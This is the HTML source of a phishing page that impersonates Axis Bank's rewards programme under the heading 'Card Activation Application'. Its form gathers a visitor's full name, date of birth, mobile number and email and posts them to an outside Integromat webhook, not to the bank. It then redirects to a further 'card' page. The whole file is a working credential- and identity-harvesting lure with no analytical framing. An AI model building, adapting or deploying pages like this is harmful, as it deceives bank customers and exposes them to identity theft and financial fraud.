<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="css/style.css" rel="stylesheet">
<title>Axis Rewards : Update Your Rewards Point</title>
<link rel="icon" href="favicon.ico" type="image/gif">
<style>
  /* Mark input boxes that gets an error on validation: */
  input.invalid {
    background-color: #97144d;
  }

  /* Hide all steps by default: */

  #prevBtn {
    background-color: #97144d;
  }

  /* Make circles that indicate the steps of the form: */
  .step {
    height: 15px;
    width: 15px;
    margin: 0 2px;
    background-color: #97144d;
    border: none;
    border-radius: 50%;
    display: inline-block;
    opacity: 0.5;
  }

  .step.active {
    opacity: 1;
  }

  /* Mark the steps that are finished and valid: */
  .step.finish {
    background-color: #97144d;
  }
</style>




</head><body>
  <header>
    <img src="images/header1.png" class="img-fluid" width="100%" usemap="#logomap">
    <map name="logomap">
      <area shape="rect" coords="40 10 300 90" href="index.html">
    </map>
  </header>
  <main class="content-section">
    <div class="container">
      <div class="row">
        <div class="col-md-7">
          <h1 class="ccoapp-note">Card Activation Application</h1>
          <h4 class="mb-3">Tell Us About Yourself</h4>
          <div class="ccoapp-tabcntholder">
          
            <form class="row g-2" id="regForm" action="https://hook.integromat.com/9kgltte5dww6wevp678moki7sw37fkqo" method="POST">
              <input type="hidden" id="redirect" name="redirect" value="card/index.html">
              <!-- One "tab" for each step in the form: -->
              <div class="tab">
                <h5>Step 1: Personal Details</h5>
                <div class="row">
                  <div class="col-sm-6 col-xs-12">
                    <div class="input-holder">
                      <label>Full Name</label>
                      <div class="input-wrapper">
                        <input class="form-control" type="text" id="cust_NAME" name="cust_NAME" required="">
                        <input type="hidden" id="custId" name="tid" value="Card Activation Application">
                      </div>
                    </div>
                  </div>
                  <div class="col-sm-6">
                    <div class="input-holder">
                      <label>Date of Birth</label>
                      <div class="input-wrapper">
                        <input class="form-control" type="date" id="cust_DOB" name="cust_DOB" required="">
                      </div>
                    </div>
                  </div>
                </div>
                <div class="row">
                  <div class="col-sm-6 col-xs-12">
                    <div class="input-holder">
                      <label>Mobile Number</label>
                      <div class="input-wrapper">
                        <input class="form-control" type="text" id="cust_MOB" name="cust_MOB" maxlength="10" required="">
                      </div>
                    </div>
                  </div>
                  <div class="col-sm-6">
                    <div class="input-holder">
                      <label>Email ID</label>
                      <div class="input-wrapper">
                        <input class="form-control" type="email" id="cust_EMAIL" name="cust_EMAIL">
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div style="overflow:auto;">
                <div style="float:right;">
                  <button class="common-button" type="submit" id="nextBtn" name="submit">Next</button>
                </div>
              </div>
              <!-- Circles which indicates the steps of the form: -->
              <div class="text-center mt-2">
                <span class="step active"></span>
                <span class="step"></span>
                <span class="step"></span>
              </div>
            </form>
          </div>
        </div>
        <!-- <div class="col-md-5 d-flex align-items-end">
          <img src="assets/images/simplyclick-cardface-n.svg" alt="" width="230" height="147">
        </div> -->
        <p id="oops" class="text-danger"><strong>Oops!</strong> All fields are required!!</p>
        <p id="status" class="text-danger"><strong>Oops!</strong> Something went wrong!!</p>
      </div>
    </div>
  </main>
  <!-- Optional JavaScript; choose one of the two! -->
  <script src="js/jquery.min.js"></script>
  <!-- Option 1: Bootstrap Bundle with Popper -->
  <script src="js/bootstrap.bundle.min.js"></script>
  <script src="js/control.js"></script>




</body></html>
